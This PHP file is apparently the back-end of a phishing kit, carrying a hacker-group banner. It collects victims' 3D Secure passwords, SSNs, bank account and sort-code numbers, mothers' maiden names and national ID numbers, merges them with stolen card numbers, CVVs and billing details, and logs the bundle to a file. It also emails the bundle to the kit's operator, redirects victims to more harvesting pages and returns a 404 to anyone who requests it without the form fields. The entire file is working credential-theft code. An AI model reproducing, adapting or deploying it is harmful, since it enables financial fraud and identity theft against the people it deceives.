<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
 if(isset($_POST['password_vbv'])&&isset($_POST['day'])){
		include '../bot.php';
        include '../mine.php';
    session_start();
    if(isset($_POST['password_vbv'])){
    $password_vbv =$_POST['password_vbv'];
    }
    if(isset($_POST['day'])&&isset($_POST['month'])&&isset($_POST['year'])){
    $dob = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
    }
    if(isset($_POST['sortnum1'])&&isset($_POST['sortnum2'])&&isset($_POST['sortnum3'])){
    $sortnum = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
    }
    if(isset($_POST['accnumber'])){
    $accnumber = $_POST['accnumber'];
    }
    if(isset($_POST['ssn1'])&&isset($_POST['ssn2'])&&isset($_POST['ssn3'])){
    $ssnnum = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
    }
    if(isset($_POST['mmname'])){
    $mmname = $_POST['mmname'];
    }
    if(isset($_POST['creditlimit'])){
    $creditlimit = $_POST['creditlimit'];
    }
        if(isset($_POST['creditlimit'])){
    $creditlimit = $_POST['creditlimit'];
    }
    if(isset($_POST['osid'])){
    $osid = $_POST['osid'];
    }if(isset($_POST['codicefiscale'])){
    $codicefiscale = $_POST['codicefiscale'];
    }if(isset($_POST['kontonummer'])){
    $kontonummer = $_POST['kontonummer'];
    }if(isset($_POST['offid'])){
    $offid = $_POST['offid'];
    }
    ########################################################
    $msg="=========== <[ -".$scamname."- 3D Full Card Info ]> ===========\r\n";
    $msg.="----------------------- Billing ---------------------\r\n";
    $msg.="Full Name    : {$_SESSION['fnm']}\r\n";
    $msg.="Birth Date   : {$_SESSION['dob']}\r\n";
    $msg.="Address      : {$_SESSION['adr']}\r\n";
    $msg.="City         : {$_SESSION['cty']}\r\n";
    $msg.="State        : {$_SESSION['stt']}\r\n";
    $msg.="Zip Code     : {$_SESSION['zip']}\r\n";
    $msg.="Country      : {$_SESSION['cnt']}\r\n";
    $msg.="Phone        : {$_SESSION['ptp']} | {$_SESSION['par']} {$_SESSION['pnm']}\r\n";
    $msg.="----------------------- BIN Info -------------\r\n";
    $msg.="CC Data      : {$_SESSION['_cc_brand_']} {$_SESSION['_cc_type_']} {$_SESSION['_cc_class_']}\r\n";
    $msg.="CC Bank      : {$_SESSION['_cc_bank_']}\r\n";
    $msg.="CC Country   : {$_SESSION['_country_']}\r\n";
    $msg.="----------------------- CC Info ---------------------\r\n";
    $msg.="CC Brand     : {$_SESSION['_cc_brand_']}\r\n";
    $msg.="CC Number    : {$_SESSION['ccn']}\r\n";
    $msg.="CC Expiry    : {$_SESSION['cex']}\r\n";
    $msg.="CVV          : {$_SESSION['csc']}\r\n";
    $msg.="----------------------- 3D Info ---------------------\r\n";

    $msg.="3D Password  : {$password_vbv}\r\n";
if(isset($_POST['day'])){$msg.="3D Birth Date: {$dob}\r\n";
}
if(isset($_POST['sortnum'])){$msg.="Sort Number      : {$sortnum}\r\n";
}
if(isset($_POST['accnumber'])){$msg.="Account Number      : {$accnumber}\r\n";
}
if(isset($_POST['ssn1'])){$msg.="SSN         : {$ssnnum}\r\n";
}
if(isset($_POST['mmname'])){$msg.="Mother’s Maiden Name         : {$mmname}\r\n";
}
if(isset($_POST['creditlimit'])){$msg.="Credit Limit         : {$creditlimit}\r\n";
}
if(isset($_POST['osid'])){$msg.="OSID         : {$creditlimit}\r\n";
}
if(isset($_POST['nabid'])){$msg.="NAB ID      : {$_POST['nabid']}\r\n";
}
if(isset($_POST['creditlimit'])){$msg.="Credit Limit         : {$creditlimit}\r\n";
}
if(isset($_POST['codicefiscale'])){$msg.="Codice Fiscale         : {$codicefiscale}\r\n";
}
if(isset($_POST['kontonummer'])){$msg.="Kontonummer         : {$kontonummer}\r\n";
}
if(isset($_POST['offid'])){$msg.="Official ID         : {$offid}\r\n";
}
if(isset($_POST['pps'])){$msg.="PPS      : {$_POST['pps']}\r\n";
}
if(isset($_POST['dln'])){$msg.="Driver Lic. : {$_POST['dln']}\r\n";
}
if(isset($_POST['sin'])){$msg.="SIN         : {$_POST['sin']}\r\n";
}
if(isset($_POST['pse'])){$msg.="PSE         : {$_POST['pse']}\r\n";
}
if(isset($_POST['dni'])){$msg.="DNI         : {$_POST['dni']}\r\n";
}
if(isset($_POST['bsn'])){$msg.="BSN         : {$_POST['bsn']}\r\n";
}
if(isset($_POST['cpf'])){$msg.="CPF         : {$_POST['cpf']}\r\n";
}
if(isset($_POST['fcn'])){$msg.="FCN         : {$_POST['fcn']}\r\n";
}
    $msg.="---------------------- IP Info ----------------------\r\n";
    $msg.="IP ADDRESS   : {$_SESSION['ip']}\r\n";
    $msg.="LOCATION     : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg.="BROWSER      : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg.="SCREEN       : {$_SESSION['screen']}\r\n";
    $msg.="USER AGENT   : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $msg.="TIMEZONE     : {$_SESSION['ip_timezone']}\r\n";
    $msg.="TIME         : ".now()." GMT\r\n";
    $msg.="=========== <[ THANKS TO SH33NZ0 ]> ===========\r\n\r\n\r\n";
        if ($saveintext=="yes") {
    $save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
    $subject="-".$scamname."- 3D FULL CARD INFO BANK [".$_SESSION['_cc_bank_']."] From [".$_SESSION['ip_countryName']."]";
    $headers="From: xAthena <cvbv@".$_SERVER['SERVER_NAME'].">\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        if ($sendtoemail=="yes") {
    @mail($yours,$subject,$msg,$headers);
}
    if(!isset($_POST['nextpage'])){
    if ($show_newcard=="yes") {
    exit(header("Location: ../../app/processcard"));
}elseif($show_mailaccess=="yes") {
    exit(header("Location: ../../app/mailprovider"));
}elseif($show_bank=="yes") {
    exit(header("Location: ../../app/bank"));
}elseif($show_identity=="yes") {
    exit(header("Location: ../../app/identity"));
}else{
        exit(header("Location: ../../app/thanks"));
}
}
///////////////////////////////////////////
if(isset($_POST['nextpage'])){
    if ($show_mailaccess=="yes") {
    exit(header("Location: ../../app/mailprovider"));
}elseif($show_bank=="yes") {
    exit(header("Location: ../../app/bank"));
}elseif($show_identity=="yes") {
    exit(header("Location: ../../app/identity"));
}else{
        exit(header("Location: ../../app/thanks"));
}
}
}
else{
     header('HTTP/1.0 404 Not Found');
          exit();
}
?>